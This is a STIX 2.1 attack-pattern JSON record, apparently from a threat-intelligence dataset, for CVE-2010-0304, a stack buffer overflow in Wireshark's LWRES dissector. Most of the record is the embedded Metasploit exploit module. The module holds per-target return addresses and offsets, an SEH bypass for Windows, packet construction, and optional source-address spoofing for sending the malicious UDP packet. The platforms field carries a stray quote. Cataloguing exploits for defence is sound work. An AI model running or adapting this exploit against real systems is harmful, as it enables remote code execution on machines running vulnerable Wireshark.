{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5bea4fc0-37fe-4336-81fd-4becff21c0c8",
    "created": "2024-08-14T17:06:49.364404Z",
    "modified": "2024-08-14T17:06:49.364407Z",
    "name": "Wireshark LWRES Dissector getaddrsbyname_request Buffer Overflow",
    "description": " The LWRES dissector in Wireshark version 0.9.15 through 1.0.10 and 1.2.0 through 1.2.5 allows remote attackers to execute arbitrary code due to a stack-based buffer overflow. This bug found and reported by babi.  This particular exploit targets the dissect_getaddrsbyname_request function. Several other functions also contain potentially exploitable stack-based buffer overflows.  The Windows version (of 1.2.5 at least) is compiled with /GS, which prevents exploitation via the return address on the stack. Sending a larger string allows exploitation using the SEH bypass method. However, this packet will usually get fragmented, which may cause additional complications.  NOTE: The vulnerable code is reached only when the packet dissection is rendered. If the packet is fragmented, all fragments must be captured and reassembled to exploit this issue. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/wireshark_lwres_getaddrbyname.rb",
            "external_id": "wireshark_lwres_getaddrbyname.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0304"
        },
        {
            "source_name": "reference",
            "url": "http://www.wireshark.org/security/wnpa-sec-2010-02.html"
        },
        {
            "source_name": "reference",
            "url": "http://anonsvn.wireshark.org/viewvc/trunk-1.2/epan/dissectors/packet-lwres.c?view=diff&r1=31596&r2=28492&diff_format=h"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Udp\n  include Msf::Exploit::Remote::Seh\n  include Msf::Exploit::Capture\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Wireshark LWRES Dissector getaddrsbyname_request Buffer Overflow',\n      'Description' => %q{\n          The LWRES dissector in Wireshark version 0.9.15 through 1.0.10 and 1.2.0 through\n        1.2.5 allows remote attackers to execute arbitrary code due to a stack-based buffer\n        overflow. This bug found and reported by babi.\n\n        This particular exploit targets the dissect_getaddrsbyname_request function. Several\n        other functions also contain potentially exploitable stack-based buffer overflows.\n\n        The Windows version (of 1.2.5 at least) is compiled with /GS, which prevents\n        exploitation via the return address on the stack. Sending a larger string allows\n        exploitation using the SEH bypass method. However, this packet will usually get\n        fragmented, which may cause additional complications.\n\n        NOTE: The vulnerable code is reached only when the packet dissection is rendered.\n        If the packet is fragmented, all fragments must be captured and reassembled to\n        exploit this issue.\n      },\n      'Author'      =>\n        [\n          'babi',   # original discovery/exploit\n          'jduck',  # ported from public exploit\n          'redsand' # windows target/testing\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2010-0304' ],\n          [ 'OSVDB', '61987' ],\n          [ 'BID', '37985' ],\n          [ 'URL', 'http://www.wireshark.org/security/wnpa-sec-2010-02.html' ],\n          [ 'URL', 'http://anonsvn.wireshark.org/viewvc/trunk-1.2/epan/dissectors/packet-lwres.c?view=diff&r1=31596&r2=28492&diff_format=h' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Privileged'     => true, # at least capture privilege\n      'Payload'        =>\n        {\n          'Space'       => 512,\n          'BadChars'    => \"\\x00\",\n          'DisableNops' => true,\n        },\n      'Platform'       => %w{ linux osx win },\n      'Targets'        =>\n        [\n          [ 'tshark 1.0.2-3+lenny7 on Debian 5.0.3 (x86)',\n            # breakpoint: lwres.so + 0x2ce2\n            {\n              'Arch'      => ARCH_X86,\n              'Platform'  => 'linux',\n              # conveniently, edx pointed at our string..\n              # and so, we write it to g_slist_append's GOT entry just before its called.\n              # pwnt.\n              #\n              #   mov [ebx+0xc],edx / jmp 0x804fc40 -->\n              #    mov [esp+4],eax / mov eax,[edi+8] / mov [esp],eax / call g_slist_append\n              #\n              'Ret'       => 0x804fc85,    # see above..\n              'RetOff'    => 376,\n              'Readable'  => 0x804fa04,    # just anything\n              'GotAddr'   => 0x080709c8    # objdump -R tshark | grep g_slist_append\n            }\n          ],\n          [ 'wireshark 1.0.2-3+lenny7 on Debian 5.0.3 (x86)',\n            {\n              'Arch'      => ARCH_X86,\n              'Platform'  => 'linux',\n              # the method for tshark doesn't work, since there aren't any convenient\n              # pointers lying around (in reg/close on stack)\n              #\n              # since the wireshark bin has a jmp esp, we'll just use that method..\n              'Ret'       => 0x818fce8,    # jmp esp in wireshark bin\n              'RetOff'    => 376,\n              'Readable'  => 0x8066a40,    # just any old readable addr (unused)\n              'GotAddr'   => 0x818601c     # objdump -R wireshark | grep g_slist_append (unused)\n            }\n          ],\n\n          [ 'wireshark 1.2.5 on RHEL 5.4 (x64)',\n            {\n              'Arch'      => ARCH_X64,\n              'Platform'  => 'linux',\n              'Ret'       => 0xfeedfed5deadbeef,\n              'RetOff'    => 152,\n            }\n          ],\n\n          [ 'wireshark 1.2.5 on Mac OS X 10.5 (x86)',\n            {\n              'Arch'      => ARCH_X86,\n              'Platform'  => 'osx',\n              'Ret'       => 0xdeadbeef,\n              'RetOff'    => 268,\n            }\n          ],\n\n          # The following target was tested against Windows XP SP3 and Windows Vista\n          [ 'wireshark/tshark 1.2.1 and 1.2.5 on Windows (x86)',\n            {\n              'Arch'      => ARCH_X86,\n              'Platform'  => 'win',\n              # NOTE: due to the length of this packet, your mileage may vary.\n              'Ret'       => 0x61B4121B,\n              # 0x655810b6 = pop/pop/ret in libpango\n              # 0x02A110B6 = pop/pop/ret in libgtk-w\n              # 0x03D710CC = pop/mov/pop/ret in packet\n              # 0x61B4121B = pop/pop/ret in pcre3\n              'RetOff'    => 2128,\n            }\n          ],\n        ],\n      'DisclosureDate' => '2010-01-27'))\n\n    register_options([\n      Opt::RPORT(921),\n      OptAddress.new('SHOST', [false, 'This option can be used to specify a spoofed source address', nil])\n    ])\n\n    deregister_options('FILTER','PCAPFILE')\n  end\n\n  def exploit\n    check_pcaprub_loaded # Check first\n\n    ret_offset = target['RetOff']\n\n    # we have different techniques depending on the target\n    if (target == targets[0])\n      # debian tshark\n      str = make_nops(ret_offset - payload.encoded.length - 16)\n      str << payload.encoded\n      str << [target['GotAddr'] - 0xc].pack('V')\n      str << rand_text(4)\n      str << [target['Readable']].pack('V')\n      str << rand_text(4)\n      # ret is next\n    elsif (target == targets[1])\n      fix_esp = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"add esp,-3500\").encode_string\n      str = make_nops(ret_offset - fix_esp.length - payload.encoded.length)\n      str << fix_esp\n      str << payload.encoded\n      # jmp esp...\n      str << [target.ret].pack('V')\n      # jump back\n      distance = ret_offset + 4\n      str << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + distance.to_s).encode_string\n    elsif (target == targets[2])\n      str = Rex::Text.pattern_create(ret_offset - 8)\n      str << Rex::Arch.pack_addr(target.arch, 0xdac0ffeebadc0ded)\n    elsif (target == targets[4])\n      # ugh, /GS and UDP length issues :-/\n      str = make_nops(ret_offset - payload.encoded.length)\n      str << payload.encoded\n      str << generate_seh_record(target.ret)\n      # jump back\n      distance = ret_offset + 8\n      str << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + distance.to_s).encode_string\n    else\n      # this is just a simple DoS payload\n      str = Rex::Text.pattern_create(ret_offset)\n      #str << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $+6\").encode_string\n    end\n\n    # add return address\n    str << Rex::Arch.pack_addr(target.arch, target.ret)\n\n    # form the packet's payload!\n    sploit =  \"\\x00\\x00\\x01\\x5d\\x00\\x00\\x00\\x00\\x4b\\x49\\x1c\\x52\\x00\\x01\\x00\\x01\"\n    sploit << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    sploit << \"\\x00\\x00\\x00\\x01\"\n    sploit << [str.length].pack('n')\n    sploit << str\n    sploit << \"\\x00\\x00\"\n\n    shost = datastore['SHOST']\n    if (shost)\n      print_status(\"Sending malformed LWRES packet to #{rhost} (spoofed from #{shost})\")\n      open_pcap\n\n      p = PacketFu::UDPPacket.new\n      p.ip_saddr = datastore['SHOST'] || Rex::Socket.source_address(rhost)\n      p.ip_daddr = rhost\n      p.udp_sport = rand((2**16)-1024)+1024\n      p.udp_dport = datastore['RPORT'].to_i\n      p.payload = sploit\n      p.recalc\n\n      sent = capture_sendto(p, rhost)\n      close_pcap\n\n      handler if sent\n    else\n      print_status(\"Sending malformed LWRES packet to #{rhost}\")\n      connect_udp\n      udp_sock.put(sploit)\n\n      handler\n      disconnect_udp\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-01-27",
    "x_mitre_platforms": [
        "win'"
    ]
}